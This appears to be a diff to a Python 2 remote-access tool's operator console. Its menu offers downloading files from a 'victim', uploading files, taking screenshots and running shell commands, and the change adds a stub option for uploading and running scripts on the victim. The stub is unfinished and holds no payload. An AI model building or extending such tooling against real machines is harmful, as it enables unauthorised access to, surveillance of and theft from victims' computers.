@@ -27,6 +27,7 @@
 ## COMPLETE: Cleanup Script
 ## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
 ## TODO: Performs searches ?
+## TODO: Run custom scripts from ./Scripts/
 ## COMPLETE: Add Local Command capability
 
 
@@ -80,6 +81,7 @@ def howToFunc():
     print("[*] Type '2' to download a file from victim")
     print("[*] Type '3' to upload a file to victim")
     print("[*] Type '4' to take a screenshot")
+    print("[*] Type '5' to run a script")
     print("[*] Type 'shell' to run a local shell command")
     print("[*] Type 'q' or 'Q' to shutdown")
 
@@ -89,7 +91,7 @@ def mainLoopFunc():
     #print('MAIN LOOP')
     while True:
         howToFunc()
-        user_input = str(raw_input("[+] Type '1', '2', '3', '4', 'shell', or 'q/Q'\n"))
+        user_input = str(raw_input("[+] Type '1', '2', '3', '4', '5', 'shell', or 'q/Q'\n"))
         print(user_input)
 
         ###################
@@ -220,6 +222,63 @@ def mainLoopFunc():
             time.sleep(SLEEP)
 
             continue
+        
+        ############
+        ## RUN SCRIPTS
+        ############
+        elif user_input is '5':
+            # From ListScripts function
+            scripts = os.listdir('./Scripts/')
+            totalScripts = (len(scripts))
+
+            #print("Below are the items")
+            for list in scripts:
+                print("Choose: " + str(scripts.index(list)+1) + " for " + list)
+
+            #print("There are a total of " + str(totalScripts))
+            
+            while True:
+                try:
+                    user_input = int(raw_input("[!] Choose the Script # or '0' to quit\n"))
+                except ValueError:
+                    print("That's not a number!")
+                else:
+                    if 1 <= user_input <= int(totalScripts):
+
+                        second_input = str(raw_input("Are you sure?? 'yes' or 'no'\n"))
+                        if second_input == 'no':
+                            print("Good catch, leaving..")
+                            break
+                        elif second_input == 'yes':
+                            print("Good job!")
+                            print("TODO: STILL WORKING ON THIS")
+                            ''' The below works
+                            new = ((user_input) -1)
+                            choice = str(scripts[new])
+                            print("You chose script: " + choice)
+                            print("Let's move that to ./Files/")
+                            shutil.copy('./Scripts/' + choice, '.')
+                            print("File is now in ./Files/")
+                            '''
+                            #####################
+                            ### TODO: Upload Script to victim
+                            ### TODO: RUN SCRIPT
+                            ### TODO: SAVE OUTPUT OF SCRIPT TO local
+                            ### TODO: GRAB FILE (Delete from local)
+                            ### TODO: REMOVE FROM ./Files/
+                            ##################### 
+                            break
+
+                        else:
+                            print("Choose 'yes' or 'no'")
+                            continue
+                    elif user_input == 0:
+                        print("Okay we leave, goodbye")
+                        break
+                    else:
+                        print("Out of Range, try again!")
+                        continue
+                
 
         elif user_input is 'q':
             #print("QUIT")
